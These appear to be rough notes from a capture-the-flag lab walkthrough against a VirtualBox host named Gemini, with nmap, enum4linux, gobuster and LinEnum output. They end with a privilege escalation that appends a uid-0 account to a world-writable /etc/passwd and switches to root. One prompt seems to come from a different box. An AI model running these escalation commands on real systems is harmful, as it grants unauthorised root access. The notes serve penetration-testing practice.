@@ -1,0 +1,109 @@
+gobuster --> hidden directory --> LFI --> id_rsa file --> /etc/passwd writable --> insert a root account
+
+└─$ sudo nmap -sT -A -Pn -n -p- 192.168.110.29            
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-22 10:45 CEST
+Nmap scan report for 192.168.110.29
+Host is up (0.00041s latency).
+Not shown: 65530 closed ports
+PORT    STATE SERVICE     VERSION
+21/tcp  open  ftp         vsftpd 3.0.3
+22/tcp  open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 a3:38:0e:b6:a1:b8:49:b1:31:a0:43:3e:61:c3:26:37 (RSA)
+|   256 fc:40:6c:0b:7b:f0:03:6e:2e:ef:2d:60:b5:96:01:b6 (ECDSA)
+|_  256 90:ed:89:27:9d:65:ea:80:54:79:65:af:2c:d7:80:43 (ED25519)
+80/tcp  open  http        Apache httpd 2.4.38 ((Debian))
+|_http-server-header: Apache/2.4.38 (Debian)
+|_http-title: Gemini Corp
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
+MAC Address: 08:00:27:E3:BE:5A (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.6
+Network Distance: 1 hop
+Service Info: Host: GEMINI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_clock-skew: mean: -40m00s, deviation: 1h09m16s, median: 0s
+|_nbstat: NetBIOS name: GEMINI, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
+| smb-os-discovery: 
+|   OS: Windows 6.1 (Samba 4.9.5-Debian)
+|   Computer name: gemini
+|   NetBIOS computer name: GEMINI\x00
+|   Domain name: \x00
+|   FQDN: gemini
+|_  System time: 2021-06-22T10:46:05+02:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2021-06-22T08:46:05
+|_  start_date: N/A
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.41 ms 192.168.110.29
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 17.03 seconds
+ 
+
+enum4linux
+[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
+S-1-22-1-1000 Unix User\william (Local User)
+
+
+└─$ gobuster dir -u http://192.168.110.29 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.110.29
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Timeout:                 10s
+===============================================================
+2021/06/22 11:09:14 Starting gobuster in directory enumeration mode
+===============================================================
+/images               (Status: 301) [Size: 317] [--> http://192.168.110.29/images/]
+/assets               (Status: 301) [Size: 317] [--> http://192.168.110.29/assets/]
+/Portal               (Status: 301) [Size: 317] [--> http://192.168.110.29/Portal/]
+/server-status        (Status: 403) [Size: 279]                                    
+                                                                                   
+===============================================================
+2021/06/22 11:09:34 Finished
+===============================================================
+
+
+
+
+charles@dc-4:/home/jim$ openssl passwd -1 -salt  bttai 123456
+$1$bttai$2okzKn9f6sFbm9kl9us3d.                                                            
+charles@dc-4:/home/jim$ head /etc/passwd
+
+LinEnum.sh
+
+1024  [-] Can we read/write sensitive files:
+1025  -rwsrwsrwx 1 root root 1456 nov  6  2020 /etc/passwd
+1026  -rw-r--r-- 1 root root 781 nov  4  2020 /etc/group
+1027  -rw-r--r-- 1 root root 767 mar  4  2016 /etc/profile
+1028  -rw-r----- 1 root shadow 967 nov  4  2020 /etc/shadow
+
+
+
+echo 'bttai:$1$bttai$2okzKn9f6sFbm9kl9us3d.:0:0:root:/root:/bin/bash' >>  /etc/passwd
+william@gemini:~$ echo 'bttai:$1$bttai$2okzKn9f6sFbm9kl9us3d.:0:0:root:/root:/bin/bash' >>  /etc/passwd
+william@gemini:~$ su bttai
+root@gemini:~# id
+uid=0(root) gid=0(root) grupos=0(root)
